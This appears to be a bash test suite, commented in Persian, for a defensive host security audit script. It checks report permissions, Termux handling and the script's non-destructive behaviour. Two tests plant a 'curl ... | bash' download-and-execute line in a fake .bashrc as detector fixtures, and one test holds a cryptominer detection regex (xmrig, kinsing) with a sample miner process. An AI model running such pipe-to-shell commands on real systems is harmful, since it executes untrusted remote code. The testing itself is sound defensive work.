#!/usr/bin/env bash
###############################################################################
# tests/test_security_audit.sh
# مجموعه تست خودکار برای security_audit.sh
# هر اسکریپت را در یک HOME موقت و ایزوله اجرا می‌کند تا به سیستم واقعی
# دست نزند، سپس نتیجه و کد خروجی را بررسی می‌کند.
###############################################################################

set -uo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
REPO_ROOT="$(dirname -- "$SCRIPT_DIR")"
TARGET_SCRIPT="${REPO_ROOT}/security_audit.sh"

PASS=0
FAIL=0

assert_eq() {
    local desc="$1" expected="$2" actual="$3"
    if [ "$expected" = "$actual" ]; then
        echo "  ✓ PASS: $desc"
        PASS=$((PASS + 1))
    else
        echo "  ✗ FAIL: $desc (انتظار: '$expected', دریافت: '$actual')"
        FAIL=$((FAIL + 1))
    fi
}

assert_contains() {
    local desc="$1" haystack="$2" needle="$3"
    if printf '%s' "$haystack" | grep -qF -- "$needle"; then
        echo "  ✓ PASS: $desc"
        PASS=$((PASS + 1))
    else
        echo "  ✗ FAIL: $desc (متن '$needle' پیدا نشد)"
        FAIL=$((FAIL + 1))
    fi
}

assert_true() {
    local desc="$1" cond="$2"
    if [ "$cond" = "0" ]; then
        echo "  ✓ PASS: $desc"
        PASS=$((PASS + 1))
    else
        echo "  ✗ FAIL: $desc"
        FAIL=$((FAIL + 1))
    fi
}

echo "=== شروع تست‌های security_audit.sh ==="
echo "اسکریپت هدف: $TARGET_SCRIPT"

[ -f "$TARGET_SCRIPT" ] || { echo "اسکریپت هدف پیدا نشد!"; exit 1; }

###############################################################################
# تست ۱: بررسی سینتکس
###############################################################################
echo ""
echo "-- تست ۱: بررسی سینتکس --"
bash -n "$TARGET_SCRIPT"
assert_true "سینتکس اسکریپت معتبر است" "$?"

###############################################################################
# تست ۲: اجرای عادی روی HOME موقت (بدون هیچ فایل خاصی) باید موفق باشد
###############################################################################
echo ""
echo "-- تست ۲: اجرای عادی روی محیط تمیز --"
TMP_HOME_1="$(mktemp -d)"
OUT_1="$(HOME="$TMP_HOME_1" bash "$TARGET_SCRIPT" 2>&1)"
EXIT_1=$?
assert_true "کد خروجی صفر است (بدون کرش)" "$EXIT_1"
assert_contains "خلاصه نهایی در خروجی وجود دارد" "$OUT_1" "خلاصه نهایی"

REPORT_1="$(find "$TMP_HOME_1" -maxdepth 1 -name 'security_report_*.txt' | head -1)"
if [ -n "$REPORT_1" ]; then
    echo "  ✓ PASS: فایل گزارش ساخته شد"
    PASS=$((PASS + 1))
    PERM="$(stat -c '%a' "$REPORT_1" 2>/dev/null)"
    assert_eq "دسترسی فایل گزارش 600 است" "600" "$PERM"
else
    echo "  ✗ FAIL: فایل گزارش ساخته نشد"
    FAIL=$((FAIL + 1))
fi
rm -rf "$TMP_HOME_1"

###############################################################################
# تست ۳: تشخیص فایل اجرایی مشکوک در Downloads
###############################################################################
echo ""
echo "-- تست ۳: تشخیص فایل اجرایی اخیر در Downloads --"
TMP_HOME_2="$(mktemp -d)"
# Match the scanner's platform-specific Downloads path.
if [ -n "${TERMUX_VERSION:-}" ] || [ -d "/data/data/com.termux" ]; then
    TEST_DOWNLOADS="$TMP_HOME_2/storage/downloads"
else
    TEST_DOWNLOADS="$TMP_HOME_2/Downloads"
fi
mkdir -p "$TEST_DOWNLOADS"
printf '%s\n' '#!/bin/sh' 'echo test' > "$TEST_DOWNLOADS/suspicious.sh"
chmod +x "$TEST_DOWNLOADS/suspicious.sh"
touch "$TEST_DOWNLOADS/suspicious.sh"
OUT_2="$(HOME="$TMP_HOME_2" bash "$TARGET_SCRIPT" 2>&1)"
EXIT_2=$?
assert_true "کد خروجی صفر است" "$EXIT_2"
assert_contains "فایل اجرایی مشکوک شناسایی شد" "$OUT_2" "suspicious.sh"
rm -rf "$TMP_HOME_2"

###############################################################################
# تست ۴: تشخیص خط مشکوک در .bashrc
###############################################################################
echo ""
echo "-- تست ۴: تشخیص خط مشکوک در .bashrc --"
TMP_HOME_3="$(mktemp -d)"
echo 'curl http://example.com/x.sh | bash' > "$TMP_HOME_3/.bashrc"
OUT_3="$(HOME="$TMP_HOME_3" bash "$TARGET_SCRIPT" 2>&1)"
EXIT_3=$?
assert_true "کد خروجی صفر است" "$EXIT_3"
assert_contains "خط مشکوک در bashrc پرچم خورد" "$OUT_3" "مشکوک"
rm -rf "$TMP_HOME_3"

###############################################################################
# تست ۵: authorized_keys با خط نامعتبر/کامنت/خالی نباید کرش کند
###############################################################################
echo ""
echo "-- تست ۵: پردازش امن authorized_keys (خط نامعتبر/کامنت/خالی) --"
TMP_HOME_4="$(mktemp -d)"
mkdir -p "$TMP_HOME_4/.ssh"
{
    echo "# یک کامنت"
    echo ""
    echo "این یک خط نامعتبر است بدون فرمت کلید"
    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleFakeKeyDataxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx user@example.com"
} > "$TMP_HOME_4/.ssh/authorized_keys"
OUT_4="$(HOME="$TMP_HOME_4" bash "$TARGET_SCRIPT" 2>&1)"
EXIT_4=$?
assert_true "با authorized_keys نامعتبر کرش نمی‌کند" "$EXIT_4"
assert_contains "بخش SSH در گزارش حضور دارد" "$OUT_4" "بررسی SSH"

# مطمئن شویم که کلید عمومی کامل در خروجی چاپ نشده (فقط اثرانگشت/نوع)
if printf '%s' "$OUT_4" | grep -qF "AAAAC3NzaC1lZDI1NTE5AAAAIExampleFakeKeyData"; then
    echo "  ✗ FAIL: کلید عمومی کامل در خروجی افشا شده (باید فقط اثرانگشت/نوع نمایش داده شود)"
    FAIL=$((FAIL + 1))
else
    echo "  ✓ PASS: کلید عمومی کامل در خروجی افشا نشده"
    PASS=$((PASS + 1))
fi
rm -rf "$TMP_HOME_4"

###############################################################################
# تست ۶: شبیه‌سازی محیط Termux (نباید کرش کند و باید مسیر Termux را انتخاب کند)
###############################################################################
echo ""
echo "-- تست ۶: شبیه‌سازی محیط Termux --"
TMP_HOME_5="$(mktemp -d)"
mkdir -p "$TMP_HOME_5/storage/downloads"
OUT_5="$(TERMUX_VERSION=0.118 HOME="$TMP_HOME_5" bash "$TARGET_SCRIPT" 2>&1)"
EXIT_5=$?
assert_true "کد خروجی صفر است" "$EXIT_5"
assert_contains "محیط Termux تشخیص داده شد" "$OUT_5" "Termux"
rm -rf "$TMP_HOME_5"

###############################################################################
# تست ۷: نام فایل حاوی فاصله نباید باعث خطا شود (تست quote بودن متغیرها)
###############################################################################
echo ""
echo "-- تست ۷: نام فایل و مسیر حاوی فاصله --"
TMP_HOME_6="$(mktemp -d)"
mkdir -p "$TMP_HOME_6/Downloads/a folder with spaces"
echo "x" > "$TMP_HOME_6/Downloads/a folder with spaces/weird name.sh"
OUT_6="$(HOME="$TMP_HOME_6" bash "$TARGET_SCRIPT" 2>&1)"
EXIT_6=$?
assert_true "با مسیر/نام فاصله‌دار کرش نمی‌کند" "$EXIT_6"
rm -rf "$TMP_HOME_6"

###############################################################################
# تست ۸: عدم وجود دستورات جانبی (ss/netstat/crontab) نباید کرش ایجاد کند
###############################################################################
echo ""
echo "-- تست ۸: اجرا با PATH محدود (بدون ابزارهای جانبی) --"
TMP_HOME_7="$(mktemp -d)"
BASH_BIN="$(command -v bash)"
BASH_DIR="$(dirname "$BASH_BIN")"
MINIMAL_PATH="$BASH_DIR:/usr/bin:/bin"
OUT_7="$(HOME="$TMP_HOME_7" PATH="$MINIMAL_PATH" "$BASH_BIN" "$TARGET_SCRIPT" 2>&1)"
EXIT_7=$?
assert_true "با PATH محدود هم کرش نمی‌کند" "$EXIT_7"
rm -rf "$TMP_HOME_7"

###############################################################################
# تست ۹: اسکریپت نباید فرآیند grep خودش را به‌اشتباه پرچم‌گذاری کند
# (رگرسیون‌تست برای باگ self-matching در بخش پردازش‌های مشکوک)
###############################################################################
echo ""
echo "-- تست ۹: عدم پرچم‌گذاری اشتباه فرآیند grep خود اسکریپت --"
PATTERN='[r]andom|[c]rypto|[m]iner|[h]idden|[x]mrig|[k]insing|[k]devtmpfsi|[c]ryptonight'
SELF_LINE="root 1234 0.0 0.1 grep -Ei -- [r]andom|[c]rypto|[m]iner|[h]idden|[x]mrig|[k]insing|[k]devtmpfsi|[c]ryptonight"
if printf '%s\n' "$SELF_LINE" | grep -Eiq -- "$PATTERN"; then
    echo "  ✗ FAIL: الگوی regex فرآیند grep خودش را پرچم‌گذاری می‌کند (باگ self-matching)"
    FAIL=$((FAIL + 1))
else
    echo "  ✓ PASS: فرآیند grep خودش پرچم‌گذاری نمی‌شود"
    PASS=$((PASS + 1))
fi
REAL_THREAT="root 5555 99.0 50.2 /tmp/.hidden/xmrig --config=/tmp/x.json"
if printf '%s\n' "$REAL_THREAT" | grep -Eiq -- "$PATTERN"; then
    echo "  ✓ PASS: تهدید واقعی (xmrig) همچنان به‌درستی شناسایی می‌شود"
    PASS=$((PASS + 1))
else
    echo "  ✗ FAIL: تهدید واقعی (xmrig) شناسایی نشد — دقت تشخیص آسیب دیده"
    FAIL=$((FAIL + 1))
fi

###############################################################################
# تست ۱۰: اسکریپت هیچ فایلی خارج از فایل گزارش خودش نباید حذف/تغییر دهد
###############################################################################
echo ""
echo "-- تست ۱۰: عدم تغییر یا حذف فایل‌های کاربر (غیرمخرب بودن) --"
TMP_HOME_8="$(mktemp -d)"
mkdir -p "$TMP_HOME_8/Downloads"
echo "hello" > "$TMP_HOME_8/Downloads/keepme.txt"
CHECKSUM_BEFORE="$(sha256sum "$TMP_HOME_8/Downloads/keepme.txt" | awk '{print $1}')"
HOME="$TMP_HOME_8" bash "$TARGET_SCRIPT" >/dev/null 2>&1
CHECKSUM_AFTER="$(sha256sum "$TMP_HOME_8/Downloads/keepme.txt" | awk '{print $1}')"
assert_eq "فایل کاربر دست‌نخورده باقی مانده" "$CHECKSUM_BEFORE" "$CHECKSUM_AFTER"
rm -rf "$TMP_HOME_8"

###############################################################################
# تست ۱۱: lesspipe/dircolors در rc نباید false positive شوند
###############################################################################
echo ""
echo "-- تست ۱۱: rc helperهای شناخته‌شده --"
TMP_HOME_9="$(mktemp -d)"
cat > "$TMP_HOME_9/.bashrc" <<'EOF'
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
EOF
OUT_9="$(HOME="$TMP_HOME_9" bash "$TARGET_SCRIPT" 2>&1)"
assert_true "rc helperهای سالم باعث کرش نمی‌شوند" "$?"
if printf '%s' "$OUT_9" | grep -q "الگوی اجرای/دانلود مشکوک"; then
    echo "  ✗ FAIL: lesspipe/dircolors false positive شدند"
    FAIL=$((FAIL+1))
else
    echo "  ✓ PASS: lesspipe/dircolors false positive نشدند"
    PASS=$((PASS+1))
fi
rm -rf "$TMP_HOME_9"

###############################################################################
# تست ۱۲: نام عمومی miner به‌تنهایی نباید تهدید تلقی شود
###############################################################################
echo ""
echo "-- تست ۱۲: جلوگیری از false positive نام عمومی --"
if grep -Fq 'if [ "$score" -ge 4 ]; then' "$TARGET_SCRIPT"; then
    echo "  ✓ PASS: پردازش‌ها با امتیاز زمینه‌ای ارزیابی می‌شوند"
    PASS=$((PASS+1))
else
    echo "  ✗ FAIL: امتیازدهی زمینه‌ای برای پردازش‌ها پیدا نشد"
    FAIL=$((FAIL+1))
fi

###############################################################################
# تست ۱۳: الگوی دانلود و اجرای shell باید تشخیص داده شود
###############################################################################
echo ""
echo "-- تست ۱۳: تشخیص زنجیره دانلود/اجرا --"
TMP_HOME_10="$(mktemp -d)"
echo 'curl https://example.com/a.sh | bash' > "$TMP_HOME_10/.bashrc"
OUT_10="$(HOME="$TMP_HOME_10" bash "$TARGET_SCRIPT" 2>&1)"
if printf '%s' "$OUT_10" | grep -q "مشکوک"; then
    echo "  ✓ PASS: زنجیره دانلود/اجرا شناسایی شد"
    PASS=$((PASS+1))
else
    echo "  ✗ FAIL: زنجیره دانلود/اجرا شناسایی نشد"
    FAIL=$((FAIL+1))
fi
rm -rf "$TMP_HOME_10"

###############################################################################
# خلاصه
###############################################################################
echo ""
echo "=== نتیجه: $PASS موفق، $FAIL ناموفق ==="
if [ "$FAIL" -eq 0 ]; then
    echo "همه‌ی تست‌ها موفق بودند ✅"
    exit 0
else
    echo "برخی تست‌ها ناموفق بودند ❌"
    exit 1
fi
